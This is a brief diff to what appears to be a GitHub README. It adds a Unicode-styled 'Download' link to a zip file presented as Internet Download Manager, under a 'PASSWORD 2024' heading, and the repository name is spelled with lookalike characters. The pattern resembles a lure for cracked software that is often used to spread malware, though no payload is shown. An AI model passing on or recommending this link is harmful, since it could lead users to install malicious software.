@@ -2,7 +2,7 @@
 
 # PASSWORD 2024 
 
-## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/HasanTheGlitcher/lNTERNET-DOWNIOAD-MANAGER/releases/download/internet-download-manager/internet-download-manager.zip)
 
 ![Internet-Download-Manager (1)](https://github.com/HasanTheGlitcher/lNTERNET-DOWNIOAD-MANAGER/assets/173244922/9d4eed45-0fd0-4eba-b4f7-8bf284e79e87)
 
